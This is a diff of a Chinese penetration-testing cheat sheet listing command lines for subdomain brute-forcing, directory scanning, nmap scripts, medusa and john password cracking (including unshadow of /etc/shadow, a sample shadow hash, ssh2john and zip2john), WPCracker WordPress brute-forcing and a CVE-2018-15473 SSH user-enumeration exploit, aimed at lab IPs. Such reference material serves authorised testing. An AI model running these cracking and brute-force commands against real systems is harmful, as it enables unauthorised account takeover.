@@ -68,7 +68,7 @@ CDN判别
 子域爆破
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 - `ESD <https://github.com/FeeiCN/ESD>`_
-	| ``pip pip install esd``
+	| ``pip install esd``
 	| ``esd -d baidu.com``
 - `subDomainsBrute <https://github.com/lijiejie/subDomainsBrute>`_
 	| ``python3 subDomainsBrute.py baidu.com``
@@ -132,7 +132,8 @@ CDN判别
 - `medusa(美杜莎) <https://github.com/jmk-foofus/medusa>`_
 	 | ``查询模块用法：medusa -M http -q``
 	 | ``medusa -H ssh1.txt -u root -P passwd.txt -M ssh``
-	 | ``medusa –M http -h 192.168.10.1 -u admin -P /usr/share/wfuzz/wordlist/fuzzdb/wordlists-user-passwd/passwds/john.txt -e ns -n 80 -F``
+	 | ``medusa -h 192.168.100.105 -u root -P /home/kali/Downloads/rockyou.txt -M mysql``
+	 | ``medusa -M http -h 192.168.10.1 -u admin -P /usr/share/wfuzz/wordlist/fuzzdb/wordlists-user-passwd/passwds/john.txt -e ns -n 80 -F``
 
 		::
 		
@@ -171,29 +172,43 @@ CDN判别
 			-l 6-6 限制密码长度为6
 			-p 000000 初始化破解起点
 	
-	| ``fcrackzip -D -p passwd passwd.zip``
+	| ``fcrackzip -u -D -p passwd passwd.zip``
 		
 		::
 		
 			-D -p passwd 密码本passwd文件
+			-u 不显示错误密码冗余信息
 			
 - john
-	| ``unshadow /etc/passwd /etc/shadow > passwd_shadow``
-	
-		::
+	+ 破解/etc/shadow
+		| ``unshadow /etc/passwd /etc/shadow > passwd_shadow``
 		
-			unshadow命令基本上会结合/etc/passwd的数据和/etc/shadow的数据，
-			创建1个含有用户名和密码详细信息的文件。
+			::
 			
-	| ``unique -v -inp=allwords.txt uniques.txt``
-	
-		::
+				unshadow命令基本上会结合/etc/passwd的数据和/etc/shadow的数据，
+				创建1个含有用户名和密码详细信息的文件。
+				
+		| ``unique -v -inp=allwords.txt uniques.txt``
 		
-			unique工具可以从一个密码字典中去除重复行。
-	
-	| ``密码文件破解：john --wordlist=/usr/share/john/password.lst --rules passwd_shadow``
-	| ``直接破解：john passwd_shadow``
-	| ``查看上一次破解结果：john --show shadow``
+			::
+			
+				unique工具可以从一个密码字典中去除重复行。
+		
+		| ``密码文件破解：john --wordlist=/usr/share/john/password.lst --rules passwd_shadow``
+		| ``直接破解：john passwd_shadow``
+		| ``查看上一次破解结果：john --show shadow``
+	+ 破解单条记录
+		| ``jeevan:$6$LXNakaBRJ/tL5F2a$bCgiylk/LY2MeFp5z9YZyiezsNsgj.5/cDohRgFRBNdrwi/2IPkUO0rqVIM3O8vysc48g3Zpo/sHuo.qwBf4U1:18430:0:99999:7:::``
+		| 存入password.txt文件
+		| ``john --wordlist=/usr/share/wordlists/rockyou.txt password.txt``
+		
+	+ 破解ssh私钥文件
+		| ``查看ssh2john位置：locate ssh2john``
+		| ``python /usr/share/john/ssh2john.py root>root.crack``
+		| ``john --wordlist=/usr/share/wordlists/rockyou.txt root.crack``
+	+ 破解zip密码
+		| ``zip2john tom.zip>hash5``
+		| ``john hash5 --format=PKZIP --wordlist=/home/kali/Downloads/rockyou.txt``
 
 路径及文件扫描
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -339,58 +354,6 @@ CDN判别
 	+ ``使用代理：dirb http://192.168.1.116  -p 46.17.45.194:5210`` 
 	+ ``添加UA和cookie：dirb http://192.168.1.116 -a "***" -c "***"`` 
 	+ ``扫描目录：dirb http://192.168.91.133 common.txt -N 404`` 
-- wfuzz
-	+ ``字典路径：/usr/share/wfuzz/wordlist`` 
-	+ ``爆破文件：wfuzz -w /usr/share/wordlists/wfuzz/general/megabeast.txt --hc 404 http://172.16.100.102/FUZZ.sh`` 
-	+ ``爆破目录：wfuzz -w wordlist http://192.168.91.137/FUZZ`` 
-	+ ``枚举参数值：wfuzz -z range,000-999 http://127.0.0.1/getuser.php?uid=FUZZ`` 
-	+ ``爆破HTTP表单：wfuzz -w userList -w pwdList -d "username=FUZZ&password=FUZ2Z" http://127.0.0.1/login.php`` 
-	+ ``携带cookie：wfuzz -z range,000-999 -b session=session -b cookie=cookie http://127.0.0.1/getuser.php?uid=FUZZ`` 
-	+ ``指定HTTP头：wfuzz -z range,0000-9999 -H "X-Forwarded-For: FUZZ" http://127.0.0.1/get.php?userid=666`` 
-	+ ``HTTP请求方法：wfuzz -z list,"GET-POST-HEAD-PUT" -X FUZZ http://127.0.0.1/`` 
-		::
-		
-			-z list可以自定义一个字典列表（在命令中体现），以-分割；
-			-X参数是指定HTTP请求方法类型，因为这里要测试HTTP请求方法，后面的值为FUZZ占位符。
-	+ ``使用代理：wfuzz -w wordlist -p 127.0.0.1:1087:SOCKS5 URL/FUZZ`` 
-	+ ``--hc/hl/hw/hh N[,N]+：隐藏指定的代码/行/字/字符的responsnes。`` 
-		::
-		
-			wfuzz -w megabeast.txt --hc=404 http://192.168.91.133/FUZZ
-	+ ``--hs regex：在响应中隐藏具有指定正则表达式的响应。`` 
-	+ ``zip并列迭代：wfuzz -z range,0-9 -w dict.txt -m zip http://127.0.0.1/ip.php?FUZZ=FUZ2Z`` 
-		::
-		
-			设置了两个字典。两个占位符，一个是range模块生成的0、1、2、3、4、5、6、7、8、
-			9,10个数字，一个是外部字典dict.txt的9行字典，使用zip迭代器组合这两个字典发送。
-			zip迭代器的功能：字典数相同、一一对应进行组合，如果字典数不一致则多余的抛弃
-			掉不请求，如上命令结果就是数字9被抛弃了因为没有字典和它组合。
-	+ ``chain组合迭代：wfuzz -z range,0-9 -w dict.txt -m chain http://127.0.0.1/ip.php?FUZZ`` 
-		::
-		
-			设置了两个字典，一个占位符FUZZ，使用chain迭代器组合这两个字典发送。
-			这个迭代器是将所有字典全部整合（不做组合）放在一起然后传入占位符FUZZ中。
-			顺序19种。
-	+ ``product交叉迭代：wfuzz -z range,0-2 -w dict.txt -m product http://127.0.0.1/ip.php?FUZZ=FUZ2Z`` 
-		::
-		
-			设置了两个字典，两个占位符，一个是range模块生成的0、1、2这3个数字，一个是外部字典
-			dict.txt的3行字典，使用product迭代器组合这两个字典发送，9种组合。
-	+ ``使用Encoders：wfuzz -z file --zP fn=wordlist,encoder=md5 URL/FUZZ`` 
-		::
-		
-			简写命令：wfuzz -z file,wordlist,md5 URL/FUZZ
-	+ ``组合Encoder：wfuzz -z file,dict.txt,md5-base64 http://127.0.0.1/ip.php\?FUZZ`` 
-		::
-		
-			多个转换，使用一个-号分隔的列表.
-			相当于组合，分别进行MD5模糊，和base64模糊测试。
-	+ ``多次Encoder：wfuzz -z file,dict.txt,base64@md5 http://127.0.0.1/ip.php\?FUZZ`` 
-		::
-		
-			多次转换，使用一个@号分隔的列表.
-			按照从右往左顺序对字典数据进行多次转换。
-	+ 注：FUZZ位置即为需要模糊测试。
 - `dirsearch <https://github.com/maurosoria/dirsearch>`_
 	+ -u 指定网址
 	+ -e 指定网站语言
@@ -408,6 +371,32 @@ CDN判别
 	+ ``使用代理：nikto -h URL -useproxy http://127.0.0.1:1080`` 
 - `GOBUSTER <https://github.com/OJ/gobuster>`_
 	+ ``目录扫描: gobuster dir -u http://192.168.100.106 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt``
+	+ 批量脚本
+	
+		::
+		
+			trap "echo Terminating...; exit;" SIGINT SIGTERM
+
+			if [ $# -eq 0 ]; then
+				echo "Usage: ott http://host threads optionalExtensions"
+				exit 1
+			fi
+
+			for f in /usr/share/dirb/wordlists/common.txt /usr/share/dirb/wordlists/big.txt /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt /usr/share/wordlists/raft/data/wordlists/raft-large-directories-lowercase.txt /usr/share/wordlists/raft/data/wordlists/raft-large-files-lowercase.txt /usr/share/wordlists/raft/data/wordlists/raft-large-words-lowercase.txt
+			do
+			  echo "Scanning: " $f
+			  echo "Extensions: " $3
+			  if [ -z "$3" ]; then
+				gobuster -t $2 dir -f --url $1 --wordlist $f | grep "Status"
+			  else
+				gobuster -t $2 dir -f --url $1 --wordlist $f -x $3 | grep "Status"
+			  fi
+			done
+		
+		+ example:
+		+ ott http://192.168.56.121 50
+		+ ott http://192.168.56.121 50 .phtml,.php,.txt,.html
+		
 - `bfac <https://github.com/mazen160/bfac>`_
 - `ds_store_exp <https://github.com/lijiejie/ds_store_exp>`_
 - `cansina <https://github.com/deibit/cansina>`_
@@ -431,11 +420,14 @@ CDN判别
 - `JA3 <https://github.com/salesforce/ja3>`_ is a standard for creating SSL client fingerprints in an easy to produce and shareable way
 - `Joomla Vulnerability Scanner <https://github.com/rezasp/joomscan>`_
 - `Drupal enumeration & exploitation tool <https://github.com/immunIT/drupwn>`_
-- wpscan：wordpress CMS识别
-	- ``插件漏洞:wpscan --url https://www.xxxxx.wiki/ --enumerate vp`` 
-	- ``主题漏洞:wpscan --url https://www.xxxxxx.wiki --enumerate vt`` 
-	- ``枚举用户:wpscan --url https://www.xxxxxxx.wiki/ --enumerate u`` 
-	- ``穷举密码:wpscan --url https://www.xxxxxxx.wiki/ --enumerate u --wordlist /root/wordlist.txt`` 
+- wpscan
+	- 插件漏洞:``wpscan --url https://www.xxxxx.wiki/ -e vp`` 
+	- 主题漏洞:``wpscan --url https://www.xxxxxx.wiki -e vt`` 
+	- 枚举用户:``wpscan --url https://www.xxxxxxx.wiki/ -e u`` 
+	- 穷举密码:``wpscan --url https://www.xxxxxxx.wiki/ -U 'admin' -P /root/wordlist.txt``
+- `WPCracker <https://github.com/JoniRinta-Kahila/WPCracker>`_
+	- 枚举用户：``.\WPCracker.exe --enum -u <Url to victims WordPress page> -o <Output file path (OPTIONAL)>``
+	- 暴力破解：``.\WPCracker.exe --brute -u <Url to victims WordPress page> -p <Path to wordlist> -n <Username> -o <Output file path (OPTIONAL)>``
 - `云悉指纹 <https://www.yunsee.cn/>`_
 - `whatweb <https://github.com/urbanadventurer/whatweb>`_
 - `Webfinger <https://github.com/se55i0n/Webfinger>`_
@@ -458,28 +450,39 @@ Waf指纹
 端口扫描
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 - `nmap <https://github.com/nmap/nmap>`_
-	+ ``范围扫描：nmap 192.168.0.100-110`` 
-	+ ``网段扫描：nmap 192.168.0.1/24`` 
-	+ ``文件列表：nmap -iL /root/target.txt`` 
-	+ ``指定端口：nmap 192.168.0.101 -p 80,8080,3306,3389`` 
-	+ ``路由追踪：nmap --traceroute 192.168.0.101`` 
-	+ ``服务版本:nmap -sV 192.168.0.101`` 
-	+ ``操作系统版本:nmap -O 192.168.0.101`` 
-	+ ``探测防火墙:nmap -sF -T4 192.168.0.101`` 
-	+ ``弱口令扫描:nmap --script=auth 192.168.0.101`` 
-	+ ``暴力破解(数据库,SMB,SNMP):nmap --script=brute 192.168.0.101`` 
-	+ ``检查常见漏洞:nmap --script=vuln 192.168.0.101`` 
-	+ ``默认脚本扫描:nmap --script=default 192.168.0.101 或者 nmap -sC 192.168.0.101`` 
-	+ ``局域网服务探测：nmap -n -p445 --script=broadcast 192.168.137.4`` 
-	+ ``smb破解:nmap --script=smb-brute.nse 192.168.137.4`` 
-	+ ``smb字典破解:nmap --script=smb-brute.nse --script-args=userdb=/var/passwd,passdb=/var/passwd 192.168.137.4`` 
-	+ ``smb漏洞：nmap --script=smb-check-vulns.nse --script-args=unsafe=1 192.168.137.4`` 
-	+ ``查看共享目录:nmap -p 445 --script smb-ls --script-args 'share=e$,path=\,smbuser=test,smbpass=test' 192.168.137.4`` 
+	+ 范围扫描
+		+ ``nmap 192.168.0.100-110``
+		+ ``nmap 192.168.0.1/24`` 
+		+ ``nmap -iL /root/target.txt`` 
+	+ 指定端口
+		+ ``nmap 192.168.0.101 -p 80,8080,3306,3389`` 
+		+ ``所有端口：nmap -p- 192.168.100.104``
+		+ ``nmap --top-ports 1000 192.168.100.105``
+	+ 路由追踪
+		+ ``nmap --traceroute 192.168.0.101`` 
+	+ 服务版本
+		+ ``nmap -sV 192.168.0.101`` 
+	+ 操作系统版本
+		+ ``nmap -O 192.168.0.101`` 
+	+ 探测防火墙
+		+ ``nmap -sF -T4 192.168.0.101``
+	+ 插件扫描
+		+ 插件列表:``ls /usr/share/nmap/scripts/ |sed 's/.nse//'>scripts.list``
+		+ 插件用法：``nmap --script-help ssh_brute``
+		+ 弱口令扫描:``--script=auth``
+		+ 暴力破解:``--script=brute``
+		+ 常见漏洞:``--script=vuln``
+		+ 默认脚本:``--script=default或者-sC``
+		+ 局域网服务探测:``--script=broadcast``
+		+ smb字典破解:``--script=smb-brute.nse --script-args=userdb=/var/passwd,passdb=/var/passwd``
+		+ smb漏洞：``--script=smb-check-vulns.nse --script-args=unsafe=1 192.168.137.4`` 
+		+ 查看共享目录:``nmap -p 445 --script smb-ls --script-args 'share=e$,path=\,smbuser=test,smbpass=test' 192.168.137.4``
+		+ ssh破解：``nmap -p22 --script ssh-brute --script-args userdb=cysec_user.txt,passdb=username.txt 172.16.226.5 -nP -vvv``
 	
 	::
 	
-	
-		注：NMAP执行结果中，端口状态后经常标记tcpwrapped。tcpwrapped表示服务器运行TCP_Wrappers服务。
+		1.默认情况下，nmap只扫描默认端口。
+		2.NMAP执行结果中，端口状态后经常标记tcpwrapped。tcpwrapped表示服务器运行TCP_Wrappers服务。
 		TCP_Wrappers是一种应用级防火墙。它可以根据预设，对SSH、Telnet、FTP服务的请求进行拦截，判断
 		是否符合预设要求。如果符合，就会转发给对应的服务进程；否则，会中断连接请求。
 		
@@ -566,5 +569,15 @@ web破解
 	|pspy|
 
 	注：其中uid为0标识具有root权限运行的进程。
+	
+FTP用户名枚举
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+- CVE-2018-15473-Exploit
+	::
+	
+		https://github.com/Rhynorater/CVE-2018-15473-Exploit/blob/master/sshUsernameEnumExploit.py
+		python sshUsernameEnumExploit.py --port 22 --userList /home/kali/Downloads/rockyou.txt 192.168.100.103 
+		
+- auxiliary(scanner/ssh/ssh_enumusers
 
 .. |pspy| image:: ../images/pspy.jpg
